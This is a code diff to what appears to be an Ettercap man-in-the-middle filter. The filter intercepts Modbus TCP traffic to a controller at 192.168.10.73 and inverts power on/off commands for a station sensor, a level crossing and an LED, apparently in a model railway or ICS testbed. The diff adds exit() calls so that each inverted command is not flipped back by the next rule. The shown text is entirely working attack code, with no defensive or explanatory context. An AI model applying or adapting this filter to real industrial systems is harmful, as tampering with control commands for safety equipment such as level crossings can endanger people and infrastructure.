@@ -17,31 +17,41 @@ if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '192.168.10.73') {
     if (search(DATA.data ,"\x0f\x00\x00\x00\x01\x01\x00")) {
         replace("\x0f\x00\x00\x00\x01\x01\x00", "\x0f\x00\x00\x00\x01\x01\x01");
         msg("Reverse station + sensor power off request.\n");
+        exit();
     }
 
     if (search(DATA.data ,"\x0f\x00\x00\x00\x01\x01\x01")) {
         replace("\x0f\x00\x00\x00\x01\x01\x01", "\x0f\x00\x00\x00\x01\x01\x00");
         msg("Reverse station + sensor power on request.\n");
+        exit();
+
     }
 
     # Qx0.1-> Q0.1 level crossing pwr
     if (search(DATA.data ,"\x0f\x00\x01\x00\x01\x01\x00")) {
         replace("\x0f\x00\x01\x00\x01\x01\x00", "\x0f\x00\x01\x00\x01\x01\x01");
         msg("Reverse level crossing pwroff request.\n");
+        exit();
+
     }
     if (search(DATA.data ,"\x0f\x00\x01\x00\x01\x01\x01")) {
         replace("\x0f\x00\x01\x00\x01\x01\x01", "\x0f\x00\x01\x00\x01\x01\x00");
         msg("Reverselevel crossing pwr on request.\n");
+        exit();
+
     }
 
     # Qx0.2-> Q0.2 Resident LED
     if (search(DATA.data ,"\x0f\x00\x02\x00\x01\x01\x00")) {
         replace("\x0f\x00\x02\x00\x01\x01\x00", "\x0f\x00\x02\x00\x01\x01\x01");
         msg("Reverse Resident LED pwroff request.\n");
+        exit();
+
     }
     if (search(DATA.data ,"\x0f\x00\x02\x00\x01\x01\x01")) {
         replace("\x0f\x00\x02\x00\x01\x01\x01", "\x0f\x00\x02\x00\x01\x01\x00");
         msg("Reverse Resident LED pwr on request.\n");
+        exit();
     }
 
 }
